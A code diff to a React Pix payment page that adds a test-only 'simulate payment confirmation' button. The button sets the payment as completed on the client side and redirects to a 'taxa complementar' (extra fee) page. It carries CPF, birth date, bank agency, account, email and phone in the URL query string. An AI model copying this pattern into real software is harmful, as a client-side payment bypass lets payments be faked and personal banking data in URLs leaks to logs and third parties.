@@ -531,6 +531,58 @@ export default function PagamentoPix() {
                   <p className="text-xs text-green-800 mt-2 pl-11">Valor total a ser depositado</p>
                 </div>
                 
+                {/* Botão de simulação - APENAS PARA TESTES */}
+                <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-lg shadow-sm p-4 border border-purple-200">
+                  <div className="flex items-center mb-2">
+                    <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                      </svg>
+                    </div>
+                    <div>
+                      <p className="text-xs font-medium text-purple-800 uppercase tracking-wide">Simulação de Pagamento</p>
+                      <Button
+                        onClick={() => {
+                          if (!paymentInfo?.id) return;
+                          
+                          setPaymentStatus("completed");
+                          toast({
+                            title: "Pagamento simulado!",
+                            description: "Simulando confirmação de pagamento. Redirecionando...",
+                            variant: "default"
+                          });
+                          
+                          // Preparar parâmetros para o redirecionamento
+                          const params = new URLSearchParams({
+                            cpf: cpf,
+                            nome: nome,
+                            valor: valor.toString(),
+                            pagamentoId: paymentInfo.id,
+                            dataPagamento: new Date().toISOString(),
+                            companhia: companhia,
+                            estado: estado,
+                            nasc: dataNascimento,
+                            agencia: urlParams.get('agencia') || "",
+                            conta: urlParams.get('conta') || "",
+                            email: email,
+                            telefone: telefone
+                          });
+                          
+                          // Redirecionar para a página de taxa complementar após simulação
+                          setTimeout(() => {
+                            console.log("[SIMULAÇÃO] Redirecionando para a página de taxa complementar");
+                            navigate(`/taxa-complementar?${params.toString()}`);
+                          }, 1500);
+                        }}
+                        className="bg-purple-600 hover:bg-purple-700 text-white w-full mt-2"
+                      >
+                        SIMULAR CONFIRMAÇÃO DE PAGAMENTO
+                      </Button>
+                    </div>
+                  </div>
+                  <p className="text-xs text-purple-800 mt-2 pl-11">Clique para simular um pagamento bem-sucedido e ver o redirecionamento</p>
+                </div>
+                
                 <div className="bg-gradient-to-br from-amber-50 to-amber-100 rounded-lg shadow-sm p-4 border border-amber-200">
                   <div className="flex items-center mb-2">
                     <div className="w-8 h-8 bg-amber-500 rounded-full flex items-center justify-center mr-3">
